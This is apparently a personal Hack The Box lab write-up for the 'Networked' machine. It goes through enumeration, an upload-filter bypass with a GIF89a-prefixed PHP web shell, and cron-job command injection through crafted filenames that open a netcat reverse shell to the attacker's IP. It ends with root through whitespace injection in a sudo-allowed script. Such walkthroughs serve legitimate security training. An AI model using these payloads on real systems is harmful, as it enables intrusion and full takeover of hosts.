###############
Networked
Linux box vulnerable to file upload bypass, leading to code execution. 
Due to improper sanitization, a crontab running as the user can be exploited 
to achieve command execution

UPLOAD FILTER BYPASS OSCP CHEATSHEET
GIF Shell.php.gif

Use of crontab mis config + PHP exec()
We use the file path on the script to get access to user account

We use sudo -l privileges to become root
https://0xdf.gitlab.io/2019/11/16/htb-networked.html
###############

1-Enummeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.85.185 -v
        PORT    STATE  SERVICE VERSION
        22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
        | ssh-hostkey: 
        |   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
        |   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
        |_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
        80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
        |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
        443/tcp closed https

        # Port 80:
        Apache 2.4.6
        PHP 5.4.16

        nikto -h http://10.129.85.185:80/ 
        └─$ gobuster dir -u http://10.129.85.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
        /uploads              (Status: 301) [Size: 237] [--> http://10.129.85.185/uploads/]
        /backup               (Status: 301) [Size: 236] [--> http://10.129.85.185/backup/]

        # We found backup.tar
        http://10.129.85.185/backup/

        # We found:
            http://10.129.85.185/photos.php
            http://10.129.85.185/upload.php

        # from the code on upload.php:
            $validext = array('.jpg', '.png', '.gif', '.jpeg');

    # Bypass File Upload Filtering:
        We can rename our shell and upload it as shell.php.jpg. 
        It passed the filter and the file is executed as php.

        If they check the content. Basically you just add the text "GIF89a;" before you shell-code. 
        So it would look something like this:

            GIF89a;
            <?
            system($_GET['cmd']);//or you can insert your complete shell code
            ?>


2-Exploit - Privc Esc:
    # Kali
        nc -lvnp 4443

    # Web Server:
        http://10.129.74.244/photos.php

    # We got a reverse shell

        sh-4.2$ id
        uid=48(apache) gid=48(apache) groups=48(apache)

    # We are able to read the crontab job an the associated php code:
        sh-4.2$ ls -la
        -r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
        -rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly


    # We will modify the check_attack.php code:
        We saw the exec() in php wich let us execute any system cmd and the $path that load a "File Path"
        We will exploit :
            $path = '/var/www/html/uploads/'
            exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");

    # For that lets go to :
        cd /var/www/html/uploads

    # We will generate a reverse shell via nc and bash:
        touch -- ';nc -c bash 10.10.15.5 8888;.php'
        touch -- ';nc -c bash 10.10.15.5 9002;.php'


    # We got a reverse shell with guly account:
        id
        uid=1000(guly) gid=1000(guly) groups=1000(guly)

    # We Check the sudo -l permission:
        sudo -l
        User guly may run the following commands on networked:
            (root) NOPASSWD: /usr/local/sbin/changename.sh

    # We take a look into the .sh:
        cat > /etc/sysconfig/network-scripts/ifcfg-guly 

    # We will abuse this part of the script:
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly



    2-Abusing of "White Space" full disclosure RedHat issue :
        We run the command:
            sudo /usr/local/sbin/changename.sh

        interface NAME:
            abc /bin/bash
        interface PROXY_METHOD:
            abc
        interface BROWSER_ONLY:
            abc
        interface BOOTPROTO:
            abc
        id
            uid=0(root) gid=0(root) groups=0(root)

    Now we are root